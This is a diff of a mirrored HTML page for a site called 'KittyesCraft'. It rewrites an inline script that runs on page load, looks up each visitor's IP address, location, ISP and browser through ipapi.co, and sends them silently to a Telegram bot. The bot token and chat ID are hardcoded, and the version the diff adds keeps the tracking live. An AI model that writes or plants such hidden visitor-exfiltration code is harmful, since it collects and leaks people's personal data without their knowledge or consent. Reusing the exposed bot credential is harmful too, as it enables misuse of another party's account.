@@ -589,73 +589,52 @@
 const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
 const chatId = "1504410647";
 
-// DOĞRUDAN ipapi.co'yu dene
-fetch('https://ipapi.co/json/', {
-    method: 'GET',
-    headers: {
-        'User-Agent': 'Mozilla/5.0',  // Tarayıcı gibi görün
-        'Accept': 'application/json'
-    }
-})
-  .then(response => {
-      if (!response.ok) {
-          throw new Error('IP API hatası: ' + response.status);
-      }
-      return response.json();
-  })
-  .then(data => {
-      console.log('Gelen IP verisi:', data);  // Konsolda kontrol et
-      
-      // Tarayıcı bilgisini al
-      const userAgent = navigator.userAgent;
-      let browser = "Bilinmiyor";
-      if (userAgent.includes("Chrome")) browser = "Google Chrome";
-      else if (userAgent.includes("Firefox")) browser = "Firefox";
-      else if (userAgent.includes("Safari")) browser = "Safari";
-      else if (userAgent.includes("Edge")) browser = "Edge";
-      
-      const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                      `🌐 <b>IP:</b> ${data.ip || 'Bilinmiyor'}\n` +
-                      `📍 <b>Konum:</b> ${data.country_name || '?'} / ${data.city || '?'}\n` +
-                      `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                      `🚀 <b>Tarayıcı:</b> ${browser}\n` +
-                      `✅ 💻 <b>Gerçek Bilgisayar</b>`;
-      
-      return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-              chat_id: chatId, 
-              text: message,
-              parse_mode: 'HTML'
-          })
-      });
-  })
+// IP adresini al
+fetch('https://ipapi.co/json/')
   .then(response => response.json())
   .then(data => {
-      console.log('Telegram sonucu:', data);
+    console.log('IP Verisi:', data); // Konsolda görmek için
+    
+    // Tarayıcı bilgisini al
+    const userAgent = navigator.userAgent;
+    let browser = "Bilinmiyor";
+    if (userAgent.includes("Chrome")) browser = "Google Chrome";
+    else if (userAgent.includes("Firefox")) browser = "Firefox";
+    else if (userAgent.includes("Safari")) browser = "Safari";
+    else if (userAgent.includes("Edge")) browser = "Edge";
+    
+    // Mesajı oluştur
+    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                    `🌐 <b>IP:</b> ${data.ip}\n` +
+                    `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
+                    `🏙️ <b>İlçe:</b> ${data.city}\n` +
+                    `📡 <b>ISP:</b> ${data.org}\n` +
+                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                    `🚀 <b>Tarayıcı:</b> ${browser}\n` +
+                    `✅ <b>Gerçek Bilgisayar</b>`;
+    
+    // Telegram'a gönder
+    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: chatId, 
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  })
+  .then(response => response.json())
+  .then(result => {
+    console.log('Telegram Sonucu:', result);
+    if(result.ok) {
+      console.log('✅ BAŞARILI! Mesaj gönderildi.');
+    } else {
+      console.log('❌ HATA:', result.description);
+    }
   })
   .catch(error => {
-      console.error('Hata:', error);
-      
-      // Hata olursa sadece IP ve zaman bilgisi gönder
-      fetch('https://api.ipify.org?format=json')
-          .then(r => r.json())
-          .then(ipData => {
-              const message = `⚠️ <b>Giriş Yapıldı (Detaysız)</b>\n\n` +
-                              `🌐 <b>IP:</b> ${ipData.ip}\n` +
-                              `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
-              
-              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ 
-                      chat_id: chatId, 
-                      text: message,
-                      parse_mode: 'HTML'
-                  })
-              });
-          });
+    console.error('Hata oluştu:', error);
   });
 </script>
 </body>
@@ -664,6 +643,7 @@ fetch('https://ipapi.co/json/', {
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
